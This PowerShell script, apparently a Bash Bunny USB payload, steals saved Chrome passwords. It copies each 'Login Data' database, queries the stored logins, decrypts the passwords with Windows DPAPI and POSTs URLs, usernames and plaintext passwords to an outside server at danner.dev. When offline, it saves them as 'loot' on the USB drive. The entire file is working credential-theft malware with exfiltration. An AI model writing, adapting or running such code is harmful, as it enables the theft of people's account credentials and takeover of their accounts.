Add-Type -AssemblyName System.Security # connect database API

$scriptPath = $MyInvocation.MyCommand.Path | Split-Path -Parent # grab the current script path
$sqlliteLibrary = $scriptPath+"\System.Data.SQLite.dll" # sqllite DLL path
Unblock-File $sqlliteLibrary # unblock DLL file
[void][System.Reflection.Assembly]::LoadFrom($sqlliteLibrary) # load the DLL
$query = "SELECT origin_url,action_url,username_value,password_value,signon_realm  FROM logins" # db query

$user=(Get-WMIObject -Class Win32_ComputerSystem).username -replace '.+\\'  # current logged in user
$paths=Get-ChildItem "C:\Users\$USER\AppData" "Login Data" -Recurse # path to "Login Data" file

# Function to decrypt the password using the win32crypt system implemented by Chrome for encryption
function decryptPassword ($encryptedPassword) {
	$decryptChar=[System.Security.Cryptography.ProtectedData]::Unprotect($encryptedPassword.password_value, $null, [Security.Cryptography.DataProtectionScope]::LocalMachine)
	foreach ($char in $decryptChar) { # for each character
		$password+=[Convert]::ToChar($char)	# add data to password until we have the full password
	}
	return $password
}

foreach ($path in $paths) { # iterate through each logindata (if there are more than one)
	$backup=$path.FullName+'_bak' # backup file as chrome holds a lock on the original file
	Copy-Item $path.FullName -Destination $backup -Force -Confirm:$false # copy the file
	$datasource = $backup # set the datasource
	$dataset = New-Object System.Data.DataSet  # create a new dataset
	$dataAdapter = New-Object System.Data.SQLite.SQLiteDataAdapter($query,"Data Source=$datasource") # create a new data adapter using the query
	[void]$dataAdapter.Fill($dataset) # fill data into the dataset
	$encryptedData=$dataset.Tables[0] | select signon_realm, username_value, password_value
	foreach ($item in $encryptedData) {
		$item.password_value=decryptPassword -encryptedPassword $item
	}
	Remove-Item $backup
}
$secret = Get-Content -Path ($scriptPath + "\secret.txt")
$encryptedData = ,$secret + $encryptedData

if(Test-Connection -ComputerName google.com -Quiet) {
	Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body ($encryptedData|ConvertTo-Json) -ContentType "application/json"
} else {
	$lootPath =  ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\loot\')
	$lootName = $lootPath + ($env:computername + "_" + (get-date).ToUniversalTime().ToString("yyyyMMddTHHmmss")) + ".json"
	$encryptedData | ConvertTo-Json | Out-File $lootName
	if([System.IO.File]::Exists($lootName)) {
		Write-Host "File written to loot folder.. offline."
	}
}